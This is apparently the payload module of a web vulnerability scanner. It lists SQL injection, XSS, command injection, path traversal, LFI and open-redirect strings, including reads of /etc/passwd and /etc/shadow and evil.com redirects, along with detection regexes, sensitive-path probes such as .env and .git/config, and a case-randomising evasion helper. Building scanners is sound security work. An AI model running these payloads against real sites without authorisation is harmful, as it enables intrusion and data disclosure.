"""
payloads.py — Rebel Protocol AWVDS
Central payload library. SQLi, XSS, CMDi, Traversal, Redirect, LFI.
"""
import random, re, string

SQLI_PAYLOADS = [
    "'", "''", "`", '"',
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "') OR ('1'='1", '" OR "1"="1',
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--", "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "1 AND 1=1", "1 AND 1=2", "' AND '1'='1", "' AND '1'='2",
    "1' AND SLEEP(3)--", "1 AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--", "1; SELECT pg_sleep(3)--",
    "' OR SLEEP(3)--", "1' OR SLEEP(3)--", "') OR SLEEP(3)--",
    "/**/OR/**/1=1", "%27 OR %271%27=%271", "\\' OR 1=1--",
]

SQLI_ERROR_PATTERNS = {
    "MySQL":      [r"you have an error in your sql syntax", r"warning: mysql", r"mysql_fetch", r"supplied argument is not a valid mysql"],
    "PostgreSQL": [r"pg_query\(\)", r"pg_exec\(\)", r"postgresql.*error", r"warning.*pg_", r"pgsqlexception"],
    "MSSQL":      [r"microsoft sql native client error", r"odbc sql server driver", r"unclosed quotation mark after the character string", r"incorrect syntax near"],
    "Oracle":     [r"ora-\d{5}", r"oracle error", r"quoted string not properly terminated"],
    "SQLite":     [r"sqlite_error", r"sqlite\.exception", r"unrecognized token"],
    "Generic":    [r"sql syntax", r"syntax error", r"database error", r"db error", r"query failed", r"invalid query"],
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>', "'><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    '" onmouseover="alert(1)', "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "<img src=x onerror=alert(1)>", "<img src='x' onerror='alert(1)'>",
    "<svg onload=alert(1)>", "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<ScRiPt>alert(1)</ScRiPt>", "<script>alert(1)</script>",
    "javascript:alert(1)", "%3Cscript%3Ealert(1)%3C/script%3E",
    "'-alert(1)-'", '"-alert(1)-"',
]

CMDI_PAYLOADS = [
    "; id", "| id", "|| id", "& id", "&& id",
    "; whoami", "| whoami", "; cat /etc/passwd", "| cat /etc/passwd",
    "`id`", "$(id)", "%0a id", "%0a whoami",
    "& dir", "| dir", "&& ver",
]

CMDI_PATTERNS = [r"uid=\d+.*gid=\d+", r"root:x:0:0", r"www-data", r"daemon", r"nobody", r"volume in drive"]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd", "../../../etc/passwd", "../../etc/passwd",
    "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "/etc/passwd", "/etc/shadow",
    "../../../../windows/win.ini", "C:\\Windows\\win.ini", "C:/Windows/win.ini",
]

TRAVERSAL_PATTERNS = [r"root:x:0:0", r"daemon:x:", r"nobody:x:", r"\[boot loader\]", r"volume in drive"]

REDIRECT_PAYLOADS = ["https://evil.com", "//evil.com", "//evil.com/path", "/\\evil.com", "\thttps://evil.com"]
REDIRECT_DOMAINS  = ["evil.com", "attacker.com"]

LFI_PAYLOADS = [
    "/etc/passwd", "../../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index",
    "file:///etc/passwd", "../../../../etc/passwd%00",
]
LFI_PATTERNS = [r"root:x:0:0", r"daemon:x:", r"www-data", r"<\?php"]

SENSITIVE_PATHS = [
    "/.env", "/.env.local", "/.env.production",
    "/.git/config", "/.git/HEAD", "/.gitignore",
    "/config.php", "/config.py", "/config.yml", "/config.yaml",
    "/database.yml", "/settings.py", "/wp-config.php",
    "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
    "/admin", "/admin/", "/login", "/wp-login.php",
    "/administrator", "/phpmyadmin", "/pma",
    "/backup", "/backup.zip", "/backup.tar.gz",
    "/dump.sql", "/db.sql", "/site.sql",
    "/error_log", "/access_log", "/logs/error.log",
    "/server-status", "/server-info",
    "/.htaccess", "/.htpasswd",
    "/swagger.json", "/api/swagger.json", "/openapi.json",
    "/api/v1", "/api/v2", "/api/users", "/api/admin",
    "/crossdomain.xml", "/robots.txt",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": {"severity": "MEDIUM", "recommendation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains", "cwe": "CWE-319"},
    "Content-Security-Policy":   {"severity": "MEDIUM", "recommendation": "Add a CSP header to restrict script/style sources.", "cwe": "CWE-693"},
    "X-Frame-Options":           {"severity": "MEDIUM", "recommendation": "Add: X-Frame-Options: DENY or SAMEORIGIN", "cwe": "CWE-1021"},
    "X-Content-Type-Options":    {"severity": "LOW",    "recommendation": "Add: X-Content-Type-Options: nosniff", "cwe": "CWE-116"},
    "Referrer-Policy":           {"severity": "LOW",    "recommendation": "Add: Referrer-Policy: no-referrer", "cwe": "CWE-200"},
    "Permissions-Policy":        {"severity": "LOW",    "recommendation": "Add a Permissions-Policy header.", "cwe": "CWE-732"},
    "X-XSS-Protection":          {"severity": "LOW",    "recommendation": "Add: X-XSS-Protection: 1; mode=block", "cwe": "CWE-79"},
}

def make_xss_marker() -> str:
    return "XSSMARK" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))

def randomize_payload(payload: str) -> str:
    for kw in ["SELECT", "UNION", "OR", "AND", "SLEEP", "FROM"]:
        if kw in payload.upper():
            replacement = "".join(c.upper() if random.random() > 0.4 else c.lower() for c in kw)
            payload = re.sub(kw, replacement, payload, flags=re.IGNORECASE, count=1)
    return payload
